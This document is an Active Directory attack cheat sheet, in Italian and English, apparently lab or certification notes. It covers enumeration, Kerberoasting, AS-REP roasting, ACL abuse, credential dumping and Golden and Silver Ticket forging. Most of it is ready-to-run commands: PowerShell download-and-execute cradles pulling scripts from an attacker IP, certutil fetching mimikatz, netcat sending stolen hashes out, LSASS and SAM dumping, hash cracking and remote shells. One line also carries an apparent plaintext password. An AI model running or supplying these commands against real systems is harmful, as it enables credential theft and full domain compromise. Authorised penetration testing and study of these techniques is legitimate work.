
# Attack Privilege Requirements
- Kerbrute Enumeration
	- No domain access required 

- Pass the Ticket
	- Access as a user to the domain required

- Kerberoasting
	- Access as any user required

- AS-REP Roasting
	- Access as any user required

- Golden Ticket
	- Full domain compromise (domain admin) required 

- Silver Ticket
	- Service hash required 

- Skeleton Key
	- Full domain compromise (domain admin) required

# Enumeration

### PowerView:
- USER Enumeration
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-Domain"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser -SPN"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser -Properties 		samaccountname,memberof"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser -Properties 		samaccountname,description"
	- hostname (vedo il mio name del computer nel dominio)
	- powershell -ep bypass -c "[System.Net.Dns]::GetHostAddresses('xor-app23')" (converte hostname in IP)

- GROUP Enumeration
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainGroup -Name 'Domain 	Admins'"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1');  Get-DomainGroup | where Name -like 	    	"*Admin*" | select SamAccountName "
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainGroupMember -Name 'Domain 	    	admins' "
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainGroup -Domain 'xor.com'"

- COMPUTER Enumeration
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-NetComputer | select 		samaccountname, operatingsystem"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainComputer -Ping "

- SHARED INFO Enumeration
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Find-DomainShare -Verbose"
	cd \\fileshare.pentesting.local\FileShare

# Overass The Hash / Pass The Key

- in PowerShell

	- Rubeus
		- Commands
			- `Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt`
		- [Rubeus](https://github.com/GhostPack/Rubeus)

	- PsExec
		- Commands
			- `PsExec.exe -accepteula \\$REMOTE_HOSTNAME cmd`

- in Kali Linux

	- Impacket
		- Commands
			- with Hash
				- `getTGT.py $DOMAIN/$DOMAIN_USER -hashes [lm_hash]:$NTLM_HASH`
			- with aesKey
				- `getTGT.py $DOMAIN/$DOMAIN_USER -aesKey $AES_KEY`
			- with Password
				- `getTGT.py $DOMAIN/$DOMAIN_USER:$PASSWORD`
			- Set TGT for impacket use
				- `export KRB5CCNAME=<TGT_ccache_file>`
			- Execute remote commands
				- `psexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
				- `smbexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
				- `wmiexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
		- [Impacket](https://github.com/SecureAuthCorp/impacket/releases/)


# Kerberoasting
### Attraverso questa tecnica l’attaccante sarà in grado di richiedere un TGS per un servizio specificandone solo il suo SPN. Active Directory stesso ritornerà un ticket criptato utilizzando l’hash NTLM dell’account associato all’SPN. L’attaccante a questo punto potrà estrarre il ticket dalla memoria e tentare di decrittarlo offline, anche attraverso attacchi a dizionario, senza rischiare di bloccare l’utenza.
- in PowerShell

	- Rubeus
		- Commands
			- `Rubeus.exe kerberoast`
		- [Rubeus](https://github.com/GhostPack/Rubeus)

	- IEX
		- Commands
			- `powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser -SPN -Properties userprincipalname,cn,serviceprincipalname"`
			
			- `powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"`
			-  `WINDOWS: nc -nv 192.168.119.206 4444 < kerb0.txt ---- LINUX: nc -lvnp 4444 > hash.txt`
			-  `powershell -ep bypass -c "[System.Net.Dns]::GetHostAddresses('xor-app23')"`
			-  `impacket-psexec username:password@IP`
			
		- [Invoke-Kerberoast](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)

	- Mimikatz
		- [How to kerberoast](https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/)

- in Kali Linux

	- Impacket
		- Commands
			- `GetUserSPNs.py $DOMAIN/$DOMAIN_USER:$PASSWORD -dc-ip $DOMAIN_CONTROLLER_IP -outputfile Output_TGSs`
		- [Impacket](https://github.com/SecureAuthCorp/impacket/releases/)

- Cracking
	- [Kirbi To John](https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/kirbi2john.py)

	- Hashcat
		- `hashcat -m 13100 --force <TGSs_file> <passwords_file>`

	- John
		- `john --format=krb5tgs --wordlist=<passwords_file> <AS_REP_responses_file>`

	- Request Service Tickets for service account SPNs
		- in Powershell
		- Add-Type –AssemblyName System.IdentityModel
		- New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken –ArgumentList ‘MSSQLSvc/jefflab-sql02.jefflab.local:1433’

	- Extract Service Tickets Using Mimikatz
		- kerberos::list /export

	- Crack the Tickets
		- tgsrepcrack.py *.kirbi $WORDLIST

	- [URL](https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/)
	- [URL](https://www.eshlomo.us/kerberoasting-extracting-service-account-password/)

# AS-REP Roasting
### L'AS-REP Roasting è una tecnica che sfrutta il protocollo Kerberos ed in particolare gli account utente che non richiedono nessuna preauthentication.  La preauthentication è appunto il primo step dell’autenticazione Kerberos ed è stata introdotta per prevenire attacchi di tipo brute-force, ed è impostata di default in un ambiente Active Directory.Tuttavia, questa fase può essere disabilitata per ogni account utente per ragioni di compatibilità con librerie che non supportano le ultime versioni di Kerberos. 
### A differenza del Kerberoasting non è necessario conoscere le credenziali di alcun utente per far leva su questa vulnerabilità, basterà una richiesta di un TGT al KDC per gli utenti che non richiedono preauthentication. Inviando l’AS_REQ al KDC, ed ottenendo in risposta l’AS_REP, sarà quindi possibile procedere immediatamente all’estrazione della Session-Key che, come visto precedentemente, è criptata con la password dell’utente.  A questo punto, come con il Kerberoasting, l’attaccante potrà tentare l’hashcracking della password in locale senza correre il rischio di bloccare l’utente in oggetto.

- in PowerShell
 	- Invoke-ASREPROAST and PowerView
		- Commands
			- `powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser -PreauthNotRequired -verbose"`
			
			- ` powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/Invoke-ASREPRoast.ps1'); Invoke-ASREPRoast -Verbose"`
	
	- Rubeus and Powerview
		- Commands
			- `powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser -PreauthNotRequired -verbose"`
			- `Rubeus.exe asreproast  /format:[<hashcat or john]> /outfile:output.asreproast`
		- [Rubeus](https://github.com/GhostPack/Rubeus)

- in Kali Linux

	- Impacket
		- Commands
			- with Credentials
				- `GetNPUsers.py $DOMAIN/$DOMAIN_USER:$PASSWORD -request -format <AS_REP_responses_format [hashcat | john]> -outputfile Output_AS_REP_Responses`
			- no Credentials
				- `GetNPUsers.py $DOMAIN/ -usersfile usernames.txt -format <AS_REP_responses_format [hashcat | john]> -outputfile Output_AS_REP_Responses`
		- [Impacket](https://github.com/SecureAuthCorp/impacket/releases/)

- Cracking
	- Hashcat
		- `hashcat -m 18200 -a 0 output.asreproast <passwords_file>`
	- John
		- `john --wordlist=<passwords_file> output.asreproast`

# ACL Misconfiguration (GenericALL o GenericWrite)
## Usare Misconfigurazione ACL per aggiungere me stesso dentro gruppo Domain Admins 

- in PowerShell

	- Powerview
		- Commands
			- `whoami /user`
			
			- `powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-ObjectAcl -SamAccountName 'DomainAdmins' -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericAll') -and ($_.SecurityIdentifier -match 'SID mio')}" `
			
			- `powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Add-DomainGroupMember -identity 'DomainAdmins' -Member 'student1' -Domain 'pentesting'"`
			
			-  `powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser -Name student1"`

# Archiviazione e recupero credenziali memorizzate
### Poiché l'implementazione di Kerberos da parte di Microsoft utilizza il single sign-on, gli hash delle password devono essere archiviati da qualche parte per rinnovare una richiesta TGT. Nelle versioni correnti di Windows, questi hash sono archiviati nello spazio di memoria LSASS (Local Security Authority Subsystem Service). Se otteniamo l'accesso a questi hash, potremmo craccarli per ottenere la password in chiaro o riutilizzarli per eseguire varie azioni.
## Problemi: Sebbene questo sia l'obiettivo finale del nostro attacco AD, il processo non è così semplice come sembra. Poiché il processo LSASS fa parte del sistema operativo e viene eseguito come SYSTEM, abbiamo bisogno delle autorizzazioni SYSTEM (o amministratore locale) per ottenere l'accesso agli hash archiviati su una destinazione.Per questo motivo, per prendere di mira gli hash archiviati, spesso dobbiamo iniziare il nostro attacco con un'escalation dei privilegi locali. Per rendere le cose ancora più complicate, le strutture di dati utilizzate per archiviare gli hash in memoria non sono pubblicamente documentate e sono anche crittografate con una chiave archiviata in LSASS

- Uso reg per recupero NTLM

	- reg
		- Commands
			- `reg save HKLM\sam sam`
			- `reg save NKLM\system system`
			- `samdump2 system sam (NTLM lo piazzi dentro un file .txt)`
			- `hashcat -m 1000 -a 3 hash.txt rockyou.txt`
		

- Con mimikatz eseguibile

	- mimikatz
		- Commands
			- mimikatz.exe
				- `certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe`
				- `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > hash.txt`
				- `impacket-psexec username:password@IP`
				- `xfreerdp /u:david /d:xor.com /p:dsfdf34534tdfGDFG5rdgr  /v:10.11.1.120`

- Con invoke-mimikatz
	- powershell
		- `powershell -ep bypass`
		- `Import-Module Invoke-Mimikatz.ps1`
		- `Invoke-Mimikatz -Command ' "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit" '`
	

# Silver Ticket
### I Silver Ticket sono ticket TGS (Ticket Granting Service) contraffatti creati da un utente malintenzionato utilizzando l'hash della password di un account di servizio compromesso. Quando un utente malintenzionato ha violato la password di un account di servizio, potrebbe sembrare che non avrebbe bisogno di falsificare i ticket per agire per suo conto. Mentre un biglietto d'oro è un TGT falso valido per ottenere l'accesso a qualsiasi servizio Kerberos, il biglietto d'argento è un TGS contraffatto. Ciò significa che l'ambito Silver Ticket è limitato a qualsiasi servizio destinato a un server specifico.
### Mentre un ticket Golden viene crittografato/firmato con l'account del servizio Kerberos di dominio ( KRBTGT) , un ticket Silver viene crittografato/firmato dall'account del servizio (credenziale dell'account del computer estratta dal SAM locale del computer o credenziale dell'account del servizio)
### I biglietti d'argento possono essere più pericolosi dei biglietti d'oro: sebbene l'ambito sia più limitato dei biglietti d'oro, l'hash richiesto è più facile da ottenere e non c'è comunicazione con un controller di dominio quando li si utilizza, quindi il rilevamento è più difficile di quelli d'oro Biglietti.
## Prerequisito: Per creare o falsificare un Silver Ticket, l'attaccante deve conoscere i dati della password (hash della password) per il servizio di destinazione. Se il servizio di destinazione è in esecuzione nel contesto di un account utente, come MS SQL, è necessario l'hash della password dell'account di servizio per creare un Silver Ticket. 

 
- in PowerShell

	- Mimikatz
		- Commands
			- with NTLM
				- `mimikatz # kerberos::golden /domain:$DOMAIN/sid:$DOMAIN_SID /rc4:$NTLM_HASH /user:$DOMAIN_USER /service:$SERVICE_SPN /target:$SERVICE_MACHINE_HOSTNAME`
			- with aesKey
				- `mimikatz # kerberos::golden /domain:$DOMAIN/sid:$DOMAIN_SID /aes128:$KRBTGT_AES_128_KEY /user:$DOMAIN_USER /service:$SERVICE_SPN /target:$SERVICE_MACHINE_HOSTNAME`
			- with Mimikatz
				- `mimikatz # kerberos::ptt <ticket_kirbi_file>`
		- [Mimikatz](https://github.com/gentilkiwi/mimikatz)

	- Rubeus
		- Commands
			- `Rubeus.exe ptt /ticket:<ticket_kirbi_file>`
		- [Rubeus](https://github.com/GhostPack/Rubeus)

	- PsExec
		- Commands
			- `PsExec.exe -accepteula \\$REMOTE_HOSTNAME cmd`

- in Kali Linux

	- Impacket
		- Commands
			- with NTLM
				- `ticketer.py -nthash $NTLM_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN -SPN $SERVICE_SPN $DOMAIN_USER`
			- with aesKey
				- `ticketer.py -aesKey $AES_KEY -domain-sid $DOMAIN_SID -domain $DOMAIN -SPN $SERVICE_SPN $DOMAIN_USER`
			- Set TGT for impacket use
				- `export KRB5CCNAME=<TGT_ccache_file>`
			- Execute remote commands
				- `psexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
				- `smbexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
				- `wmiexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
		- [Impacket](https://github.com/SecureAuthCorp/impacket/releases/)

# Golden Ticket
### Tornando alla spiegazione dell'autenticazione Kerberos, ricordiamo che quando un utente inoltra una richiesta per un TGT, il KDC crittografa il TGT con una chiave segreta nota solo ai KDC nel dominio. Questa chiave segreta è in realtà l'hash della password di un account utente di dominio chiamato krbtgt. Se riusciamo a mettere le mani sull'hash della password krbtgt, potremmo creare i nostri TGT personalizzati o biglietti d'oro.
### Ad esempio, potremmo creare un TGT in cui si afferma che un utente senza privilegi è in realtà un membro del gruppo Domain Admins e il controller di dominio lo considererà attendibile poiché è crittografato correttamente.
## Prerequisito: In questa fase del coinvolgimento, dovremmo avere accesso a un account che è un membro del gruppo Domain Admins o abbiamo compromesso il controller di dominio stesso. 

- in PowerShell

	- Mimikatz (esempio 1)

		- Commands
			- with NTLM
				- `mimikatz # kerberos::purge`
				- `mimikatz # kerberos::golden /domain:$DOMAIN /sid:$DOMAIN_SID /krbtgt:$NTLM_HASH /user:fakeuser /ptt`
				- `mimikatz # misc::cmd`
				- `PsExec.exe -accepteula \\dc01 cmd`
	
	- Mimikatz (esempio 2)

		- Commands
			- with NTLM
				- `mimikatz # kerberos::golden /domain:$DOMAIN/sid:$DOMAIN_SID /rc4:$NTLM_HASH /user:$DOMAIN_USER /target:$SERVICE_MACHINE_HOSTNAME`
			- with aesKey
				- `mimikatz # kerberos::golden /domain:$DOMAIN/sid:$DOMAIN_SID /aes128:$KRBTGT_AES_128_KEY /user:$DOMAIN_USER /target:$SERVICE_MACHINE_HOSTNAME`
			- with Mimikatz
				- `mimikatz # kerberos::ptt <ticket_kirbi_file>`
		- [Mimikatz](https://github.com/gentilkiwi/mimikatz)

	- Rubeus

		- Commands
			- `Rubeus.exe ptt /ticket:<ticket_kirbi_file>`
		- [Rubeus](https://github.com/GhostPack/Rubeus)

	- PsExec

		- Commands
			- `PsExec.exe -accepteula \\dc01 cmd`

- in Kali Linux

	- Impacket

		- Commands
			- with NTLM
				- `ticketer.py -nthash $KRBTGT_NTLM_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN $DOMAIN_USER`
			- with aesKey
				- `ticketer.py -aesKey $AES_KEY -domain-sid $DOMAIN_SID -domain $DOMAIN $DOMAIN_USER`
			- Set TGT for impacket use
				- `export KRB5CCNAME=<TGT_ccache_file>`
			- Execute remote commands
				- `psexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
				- `smbexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
				- `wmiexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
		- [Impacket](https://github.com/SecureAuthCorp/impacket/releases/)

### Skeleton Ticket

### Extra Mile

- NTLM from password

	- `python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'`

- [Cheatsheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)

- [Mimikatz History](https://ivanitlearning.wordpress.com/2019/09/07/mimikatz-and-password-dumps/)
